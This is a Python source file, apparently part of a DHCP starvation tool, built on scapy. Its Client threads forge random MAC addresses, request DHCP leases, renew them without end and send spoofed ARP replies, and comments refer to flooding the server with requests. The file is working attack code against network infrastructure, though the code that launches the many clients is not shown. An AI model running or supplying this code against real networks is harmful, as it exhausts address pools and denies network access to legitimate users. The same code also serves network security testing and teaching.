import os
import sys
from random import randint
from threading import Thread
from time import sleep

from scapy.arch import str2mac
from scapy.config import conf
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, ICMP, UDP
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import sr1, sendp, sniff, srp1, send
from scapy.utils import mac2str
from scapy.volatile import RandMAC

OFFER = 2
ACK = 5
NAK = 6

TIMEOUT = 0.1


class Client(Thread):
    iface = conf.iface  # default interface
    target = conf.route.route("0.0.0.0")[2]  # default DHCP server
    target_mac = None
    lock = None
    persist = False

    def __init__(self):
        Thread.__init__(self)
        # generate random mac address
        self.ch_mac = mac2str(str(RandMAC()))
        self.mac = str2mac(self.ch_mac)
        self.transaction_id = randint(0, 0xffffffff)
        self.ip = None

    def run(self):
        """
        Discover -> Offer -> Request -> ACK
        According to RFC 2131 (DHCPv4),
        after receiving an ack packet the client should wait for 50% of the lease time before sending a new request.
        If the client does not receive a response from the server,
        the next request from the client should be after 88.5% of the lease time.
        """
        self.discover()
        offer_packet = self.sniffer(OFFER)

        if not offer_packet:
            return  # if timeout occurs stop the current thread

        self.ip = offer_packet[BOOTP].yiaddr  # get the ip address from the offer packet
        self.request()
        ack_packet = self.sniffer(ACK)
        if not ack_packet:
            sys.exit()
        self.ip = ack_packet[BOOTP].yiaddr  # if the server gave us a different IP

        time_for_release = ack_packet[DHCP].lease_time
        # every loop we renew the same ip address
        while True:  # renew the lease infinite times
            sleep(time_for_release * 0.5)  # wait for 50% of the lease time
            self.request()
            ack_packet = self.sniffer(ACK)
            if ack_packet:  # receive ack packet successfully
                time_for_release = ack_packet[DHCP].lease_time
                self.ip = ack_packet[BOOTP].yiaddr  # if the server gave us a different IP
                self.send_is_at_arp()
                continue  # renew the lease
            else:  # not receiving ack
                sleep(time_for_release * (0.885 - 0.5))  # wait for 88.5% of the lease time
                self.request()
                ack_packet = self.sniffer(ACK)
                if not ack_packet:  # if not receive ack packet
                    sys.exit()  # close current thread
                time_for_release = ack_packet[DHCP].lease_time

    def sniffer(self, op):
        packets = sniff(
            count=1,
            iface=Client.iface,
            timeout=TIMEOUT,
            lfilter=lambda p:
            BOOTP in p and
            UDP in p and
            p[UDP].sport == 67 and  # the packet is from server (OFFER or ACK)
            p[BOOTP].xid == self.transaction_id and  # the packet is for the current client
            dict([ops for ops in p[DHCP].options if len(ops) == 2])['message-type'] in [op, NAK],
        )

        if len(packets) == 0 or dict(
                [ops for ops in packets[0][DHCP].options if len(ops) == 2]
        )['message-type'] == NAK:  # if timeout occurs or we receive NAC
            if not Client.persist:
                # if not persistent the program terminated when the server is down
                os._exit(0)
            # all the threads that came here when its lock going to kill
            elif Client.lock.acquire(blocking=True, timeout=TIMEOUT):
                # stop create clients, DHCP server is down
                print('========= LOCK Locked =========')
                sleep(TIMEOUT * 100)  # try again after TIMEOUT * 100 seconds (if real client disconnect)
                Client.lock.release()
                print('========= LOCK Release =========')
                return False
            else:  # if the lock is acquired that's mean that we send too many requests
                # close current thread
                sys.exit()

        else:
            return packets[0]

    def discover(self):
        print(f'D: 0x{self.transaction_id:08x}')
        packet = Ether(
            src=self.mac,
            dst='ff:ff:ff:ff:ff:ff'
        ) / IP(
            src='0.0.0.0', dst='255.255.255.255'
        ) / UDP(
            dport=67, sport=68
        ) / BOOTP(
            op=1, chaddr=self.ch_mac, xid=self.transaction_id
        ) / DHCP(
            options=[('message-type', 'discover'),
                     'end']
        )
        sendp(packet, iface=Client.iface, verbose=0)

    def request(self):
        print(f'R: 0x{self.transaction_id:08x}')
        packet = Ether(
            src=self.mac,
            dst='ff:ff:ff:ff:ff:ff'
        ) / IP(
            src='0.0.0.0', dst='255.255.255.255'
        ) / UDP(
            dport=67, sport=68
        ) / BOOTP(
            op=3, chaddr=self.ch_mac, xid=self.transaction_id
        ) / DHCP(
            options=[('message-type', 'request'),
                     ("server_id", Client.target),
                     ('requested_addr', self.ip),
                     'end']
        )
        sendp(packet, iface=Client.iface, verbose=0)

    def send_is_at_arp(self):
        reply = ARP(op=2, hwsrc=self.mac, psrc=self.ip, hwdst=self.target_mac, pdst=self.target)
        # Sends the is at message to the server
        send(reply, iface=self.iface, verbose=0)
